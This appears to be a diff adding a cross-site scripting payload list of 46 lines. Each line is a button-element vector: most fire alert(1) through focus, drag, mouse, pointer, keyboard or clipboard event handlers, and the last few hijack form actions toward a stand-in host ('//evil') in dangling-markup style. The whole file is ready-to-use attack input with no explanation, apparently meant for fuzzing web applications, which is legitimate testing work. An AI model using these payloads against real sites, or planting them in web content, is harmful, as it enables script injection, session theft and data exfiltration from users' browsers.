@@ -1,0 +1,46 @@
+<button autofocus onfocus=alert(1)>test</button>
+<button autofocus onfocusin=alert(1)>test</button>
+<button draggable="true" ondrag="alert(1)">test</button>
+<button draggable="true" ondragend="alert(1)">test</button>
+<button draggable="true" ondragenter="alert(1)">test</button>
+<button draggable="true" ondragleave="alert(1)">test</button>
+<button draggable="true" ondragstart="alert(1)">test</button>
+<button id=x tabindex=1 onactivate=alert(1)></button>
+<button id=x tabindex=1 onbeforeactivate=alert(1)></button>
+<button id=x tabindex=1 onbeforedeactivate=alert(1)></button><input autofocus>
+<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>
+<button onafterscriptexecute=alert(1)><script>1</script>
+<button onbeforecopy="alert(1)" contenteditable>test</button>
+<button onbeforecut="alert(1)" contenteditable>test</button>
+<button onbeforepaste="alert(1)" contenteditable>test</button>
+<button onbeforescriptexecute=alert(1)><script>1</script>
+<button onblur=alert(1) id=x></button><input autofocus>
+<button onclick="alert(1)">test</button>
+<button oncontextmenu="alert(1)">test</button>
+<button oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<button oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<button ondblclick="alert(1)" autofocus tabindex=1>test</button>
+<button onfocusout=alert(1) id=x></button><input autofocus>
+<button onkeydown="alert(1)" contenteditable>test</button>
+<button onkeypress="alert(1)" contenteditable>test</button>
+<button onkeyup="alert(1)" contenteditable>test</button>
+<button onmousedown="alert(1)">test</button>
+<button onmouseenter="alert(1)">test</button>
+<button onmouseleave="alert(1)">test</button>
+<button onmousemove="alert(1)">test</button>
+<button onmouseout="alert(1)">test</button>
+<button onmouseover="alert(1)">test</button>
+<button onmouseup="alert(1)">test</button>
+<button onmousewheel=alert(1)>requires scrolling
+<button onpaste="alert(1)" contenteditable>test</button>
+<button onpointerdown=alert(1)>XSS</button>
+<button onpointerenter=alert(1)>XSS</button>
+<button onpointerleave=alert(1)>XSS</button>
+<button onpointermove=alert(1)>XSS</button>
+<button onpointerout=alert(1)>XSS</button>
+<button onpointerover=alert(1)>XSS</button>
+<button onpointerrawupdate=alert(1)>XSS</button>
+<button onpointerup=alert(1)>XSS</button>
+<button form=x style="width:100%;height:100%;"><form id=x action="//evil?
+<button form=x>XSS</button><form id=x action=//evil target='
+<button form=test onformchange=alert(1)>//INJECTX
